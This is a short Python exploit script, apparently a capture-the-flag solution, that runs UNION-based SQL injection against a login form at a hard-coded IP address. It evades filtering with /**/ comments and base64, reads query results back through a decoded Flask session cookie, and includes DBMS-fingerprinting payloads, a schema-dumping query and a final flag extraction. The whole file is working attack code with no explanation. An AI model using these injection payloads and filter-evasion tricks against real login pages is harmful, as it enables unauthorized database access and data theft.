import requests
import base64
from flask_unsign import decode

def exploit(payload):
    url = "http://20.195.43.216:8031/login"
    headers = {
        "Cookie": "session=eyJ1c2VyIjoiNzkyNiJ9.Z9TNhA.Ab82OPIqVmGG9uFr8sSFT_Uf2vA"
    }
    data = {
        "username": base64.b64encode(payload.replace(" ", "/**/").encode()).decode(),
        "password": "MTIzMeY=",
        "captcha": "7926"
    }
    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    return decode(response.headers['Set-Cookie'].split('=')[1].split(';')[0])

# check dbms
payloads = [
    "SELECT VERSION()",
    "SELECT version()",
    "SELECT sqlite_version()",
    "SELECT @@VERSION",
    "SELECT * FROM v$version",
    "SELECT banner FROM v$version",
    "SELECT service_level, version FROM TABLE (sysproc.env_get_inst_info())",
    "SELECT version()"
]

# for payload in payloads:
#     req = exploit(f"' union select ({payload}) -- ")
#     print(payload, req)

# get db structure
# req = exploit("' union select (SELECT GROUP_CONCAT(sql) FROM sqlite_master) -- ")

req = exploit("' union select (SELECT fl4gz FROM fl4gz_ls_h3re) -- ")
print(req)
